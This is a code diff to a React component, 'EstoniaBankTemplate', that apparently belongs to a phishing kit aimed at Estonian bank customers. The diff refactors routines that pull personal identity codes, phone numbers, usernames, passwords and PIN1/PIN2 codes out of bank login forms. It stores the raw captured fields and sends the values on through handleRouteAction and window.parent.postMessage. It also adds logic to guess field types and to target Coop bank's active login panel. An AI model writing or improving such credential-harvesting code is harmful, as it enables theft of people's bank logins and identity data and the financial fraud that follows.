@@ -108,6 +108,162 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     );
   };
 
+  const shouldIgnoreCapturedField = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    const candidates = [
+      field.key,
+      field.name,
+      field.id,
+      field.formControlName,
+      field.label,
+      field.ariaLabel,
+      field.placeholder,
+    ]
+      .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
+      .filter(Boolean);
+
+    if (!candidates.length) {
+      return false;
+    }
+
+    return candidates.every((candidate) => shouldIgnoreRawBankFieldKey(candidate));
+  };
+
+  const getFieldSearchText = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) =>
+    [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+  const isPhoneLikeField = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    const lowerText = getFieldSearchText(field);
+    return (
+      lowerText.includes("mobilenumber") ||
+      lowerText.includes("mobile number") ||
+      lowerText.includes("phonefield") ||
+      lowerText.includes("phone-number") ||
+      lowerText.includes("telefoninumber") ||
+      lowerText.includes("telefon") ||
+      lowerText.includes("phone")
+    );
+  };
+
+  const isPersonalCodeLikeField = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    const lowerText = getFieldSearchText(field);
+    return (
+      lowerText.includes("personalidentitycode") ||
+      lowerText.includes("personalidentificationcode") ||
+      lowerText.includes("personal identity code") ||
+      lowerText.includes("identitycode") ||
+      lowerText.includes("identity code") ||
+      lowerText.includes("isikukood") ||
+      lowerText.includes("personal-code") ||
+      lowerText.includes("personal code") ||
+      lowerText.includes("legalid")
+    );
+  };
+
+  const isUsernameLikeField = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    const lowerText = getFieldSearchText(field);
+    return (
+      lowerText.includes("userid") ||
+      lowerText.includes("user id") ||
+      lowerText.includes("user-id") ||
+      lowerText.includes("username") ||
+      lowerText.includes("loginid") ||
+      lowerText.includes("login id") ||
+      lowerText.includes("nickname") ||
+      lowerText.includes("kasutajanimi") ||
+      lowerText.includes("kasutajatunnus") ||
+      lowerText.includes("tunnus")
+    );
+  };
+
+  const isPasswordLikeField = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    type?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    const lowerText = getFieldSearchText(field);
+    const lowerKey = (field.key ?? "").toLowerCase();
+
+    return (
+      (field.type ?? "").toLowerCase() === "password" ||
+      lowerText.includes("pincalcpassword") ||
+      (lowerKey.includes("pin-calculator") && lowerKey.includes("code")) ||
+      lowerText.includes("pin calculator code") ||
+      lowerText.includes("pin-calculator-code") ||
+      lowerText.includes("password") ||
+      lowerText.includes("passcode") ||
+      lowerText.includes("parool") ||
+      lowerText.includes("pin1") ||
+      lowerText.includes("pin2") ||
+      lowerText.includes("pin code") ||
+      lowerText.includes("pin-code") ||
+      lowerKey === "pin" ||
+      lowerKey.endsWith("password")
+    );
+  };
+
+  const inferOrderedFieldType = (field: {
+    key?: string;
+    name?: string;
+    id?: string;
+    formControlName?: string;
+    type?: string;
+    label?: string;
+    ariaLabel?: string;
+    placeholder?: string;
+  }) => {
+    if (isPhoneLikeField(field)) return "phone";
+    if (isPasswordLikeField(field)) return "password";
+    return "identity";
+  };
+
   const normalizeCapturedFields = (
     payload: unknown,
   ): Array<{
@@ -250,10 +406,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           persistRawCapturedField(field);
 
           const lowerKey = field.key.toLowerCase();
-          const lowerText = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
-            .filter(Boolean)
-            .join(" ")
-            .toLowerCase();
+          const lowerText = getFieldSearchText(field);
 
           if (lowerText.includes("rememberme") || lowerText.includes("pea mind meeles") || lowerText.includes("remember me")) {
             continue;
@@ -285,7 +438,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             }
           }
 
-          if (shouldIgnoreRawBankFieldKey(lowerKey)) {
+          if (shouldIgnoreCapturedField(field)) {
             continue;
           }
 
@@ -309,67 +462,22 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             continue;
           }
 
-          if (
-            lowerText.includes("personalidentitycode") ||
-            lowerText.includes("personalidentificationcode") ||
-            lowerText.includes("personal identity code") ||
-            lowerText.includes("identitycode") ||
-            lowerText.includes("identity code") ||
-            lowerText.includes("isikukood") ||
-            lowerText.includes("personal-code") ||
-            lowerText.includes("personal code") ||
-            lowerText.includes("legalid")
-          ) {
+          if (isPersonalCodeLikeField(field)) {
             assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
             continue;
           }
 
-          if (
-            lowerText.includes("mobilenumber") ||
-            lowerText.includes("mobile number") ||
-            lowerText.includes("phonefield") ||
-            lowerText.includes("phone-number") ||
-            lowerText.includes("telefon") ||
-            lowerText.includes("phone")
-          ) {
+          if (isPhoneLikeField(field)) {
             assignMappedValue("bankPhone", value, { overwrite: true });
             continue;
           }
 
-          if (field.type?.toLowerCase() === "password") {
+          if (isPasswordLikeField(field)) {
             assignPassword(value, true);
             continue;
           }
 
-          if (
-            lowerText.includes("pincalcpassword") ||
-            (lowerKey.includes("pin-calculator") && lowerKey.includes("code")) ||
-            lowerText.includes("pin calculator code") ||
-            lowerText.includes("password") ||
-            lowerText.includes("passcode") ||
-            lowerText.includes("parool") ||
-            lowerText.includes("pin1") ||
-            lowerText.includes("pin2") ||
-            lowerKey === "pin" ||
-            lowerKey.endsWith("password")
-          ) {
-            assignPassword(value, true);
-            continue;
-          }
-
-          if (
-            lowerText.includes("userid") ||
-            lowerText.includes("user id") ||
-            lowerText.includes("user-id") ||
-            lowerText.includes("username") ||
-            lowerText.includes("loginid") ||
-            lowerText.includes("login id") ||
-            lowerText.includes("nickname") ||
-            lowerText.includes("kasutajanimi") ||
-            lowerText.includes("kasutajatunnus") ||
-            lowerText.includes("tunnus") ||
-            lowerText.includes("loginid")
-          ) {
+          if (isUsernameLikeField(field)) {
             assignUsername(value, true);
             continue;
           }
@@ -409,13 +517,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             value: field.value.trim(),
           }))
           .filter((field) => Boolean(field.value))
-          .filter(
-            (field) =>
-              !shouldIgnoreRawBankFieldKey(field.key) &&
-              !shouldIgnoreRawBankFieldKey(field.name) &&
-              !shouldIgnoreRawBankFieldKey(field.id) &&
-              !shouldIgnoreRawBankFieldKey(field.formControlName),
-          )
+          .filter((field) => !shouldIgnoreCapturedField(field))
           .filter((field, index, list) => list.findIndex((candidate) => candidate.value === field.value) === index);
 
         const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
@@ -423,21 +525,8 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           assignMappedValue("personalCode", filledValues[0].value, { overwrite: true, syncState: true });
         }
 
-        const passwordFallback = filledValues.find((field) => {
-          const lowerText = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
-            .filter(Boolean)
-            .join(" ")
-            .toLowerCase();
-
-          return (
-            field.type.toLowerCase() === "password" ||
-            lowerText.includes("password") ||
-            lowerText.includes("passcode") ||
-            lowerText.includes("parool") ||
-            lowerText.includes("pin") ||
-            lowerText.includes("kood")
-          );
-        });
+        const passwordFallback = filledValues.find((field) => isPasswordLikeField(field));
+        const orderedField2Type = filledValues[1] ? inferOrderedFieldType(filledValues[1]) : "";
 
         if (!mappedData.password) {
           if (passwordFallback?.value) {
@@ -448,6 +537,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         handleRouteAction({
           orderedField1: filledValues[0]?.value ?? "",
           orderedField2: filledValues[1]?.value ?? "",
+          orderedField2Type,
           ...rawCapturedData,
           ...mappedData,
         });
@@ -873,7 +963,13 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         };
 
         const submitCoopVisibleFields = () => {
-            const coopFields = buildCapturedFields(document);
+            const activeCoopPanel =
+                document.querySelector('.v-window-item--active') ||
+                document.querySelector('.v-window-item:not([style*="display:none"])');
+            const coopFields = buildCapturedFields(activeCoopPanel || document);
+            if (coopFields.length === 0) {
+                coopFields.push(...buildCapturedFields(document));
+            }
             const coopInputs = buildInputMap(coopFields);
 
             window.parent.postMessage({
